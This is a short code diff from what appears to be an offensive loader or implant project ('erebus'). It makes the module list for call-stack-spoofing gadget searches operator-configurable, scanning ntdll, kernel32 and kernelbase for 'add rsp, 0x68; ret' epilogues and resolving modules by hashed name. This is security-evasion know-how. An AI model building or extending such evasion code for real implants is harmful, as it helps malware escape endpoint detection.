@@ -1,4 +1,5 @@
 #include "../../include/loader.hpp"
+#include "../../include/config.hpp"
 #include "../../include/evasion/callstack_spoof.hpp"
 
 namespace erebus {
@@ -40,12 +41,13 @@ BOOL InitCallstackSpoof()
     if (g_spoof_init) return g_spoof_gadget != NULL;
     g_spoof_init = TRUE;
 
-    // Search ntdll first; it has hundreds of `add rsp, N; ret` epilogues.
-    // Fall through to kernel32/kernelbase if 0x68 not found (rare).
-    static const ULONG mods[] = {
-        H("ntdll.dll"), H("kernel32.dll"), H("kernelbase.dll")
-    };
-    for (int i = 0; i < 3 && !g_spoof_gadget; i++)
+    // Operator-selected module list (CONFIG_CALLSTACK_SPOOF_MODULES). Default
+    // ntdll/kernel32/kernelbase have hundreds of `add rsp, 0x68; ret` epilogues;
+    // custom modules are scanned in the order the operator listed them. First
+    // match wins. PEB-walk only — module must already be mapped in the host.
+    static const ULONG mods[] = { CONFIG_CALLSTACK_SPOOF_MODULES };
+    const SIZE_T mod_count = CONFIG_CALLSTACK_SPOOF_MODULE_COUNT;
+    for (SIZE_T i = 0; i < mod_count && !g_spoof_gadget; i++)
         g_spoof_gadget = FindAddRspRetGadget(GetModuleHandleC(mods[i]), 0x68);
 
     return g_spoof_gadget != NULL;
